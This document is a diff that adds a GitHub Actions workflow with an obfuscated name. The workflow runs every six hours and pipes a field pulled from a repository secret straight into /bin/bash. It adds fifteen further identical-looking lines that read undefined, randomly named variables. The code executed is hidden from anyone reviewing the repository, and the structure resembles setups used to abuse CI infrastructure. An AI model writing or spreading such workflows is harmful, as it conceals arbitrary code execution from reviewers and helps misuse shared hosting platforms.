@@ -1,0 +1,33 @@
+name: shangxike6328
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shangxike6328
+        env:
+          h7: ${{ secrets.h7 }}
+        run: |
+          echo $h7 | jq -r .obl43235 | /bin/bash
+          echo $fjwf1939 | jq -r .fyeg13640 | /bin/bash
+          echo $gf692 | jq -r .vi27 | /bin/bash
+          echo $ww89062 | jq -r .f616 | /bin/bash
+          echo $v043 | jq -r .zy94 | /bin/bash
+          echo $ovx379 | jq -r .eh70 | /bin/bash
+          echo $jjn8 | jq -r .uegp4764 | /bin/bash
+          echo $hqr1 | jq -r .v3861 | /bin/bash
+          echo $rsrx27 | jq -r .ibcaw90458 | /bin/bash
+          echo $aa69000 | jq -r .bjbg8 | /bin/bash
+          echo $nlgii4790 | jq -r .dtzr14711 | /bin/bash
+          echo $v0574 | jq -r .vlp28257 | /bin/bash
+          echo $sg57197 | jq -r .rgxt40666 | /bin/bash
+          echo $ciwei77410 | jq -r .d81 | /bin/bash
+          echo $vjzh6602 | jq -r .sax0 | /bin/bash
+          echo $whcs9 | jq -r .gncf92090 | /bin/bash
+
